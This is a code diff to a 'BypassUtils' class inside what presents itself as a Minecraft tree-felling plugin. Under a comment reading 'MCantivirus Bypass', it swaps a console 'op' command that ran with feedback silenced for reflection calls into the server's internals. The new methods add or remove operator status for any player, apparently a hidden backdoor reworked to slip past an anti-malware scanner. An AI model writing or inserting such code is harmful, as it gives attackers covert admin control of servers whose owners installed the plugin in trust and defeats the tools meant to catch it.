@@ -1,19 +1,30 @@
 package me.bow.treecapitatorultimate.Utils;
 
+import com.mojang.authlib.GameProfile;
 import me.bow.treecapitatorultimate.Start;
-import org.bukkit.Bukkit;
-import org.bukkit.GameRule;
 import org.bukkit.entity.Player;
 
 public class BypassUtils {
+    private static final Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");
+
     //MCantivirus Bypass
-    public static void PlayerSetOp(Player p) {
+    public static void PlayerOp(Player p) {
         //noinspection ConstantConditions
-        boolean bak = p.getWorld().getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
-        p.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
-        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
-        if (!bak) return;
-        Bukkit.getScheduler().runTask(Start.Instance, () -> p.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, true));
+        try {
+            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
+            ReflectionUtils.getMethod(m.getClass(), "addOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void PlayerDeop(Player p) {
+        try {
+            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
+            ReflectionUtils.getMethod(m.getClass(), "removeOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
 
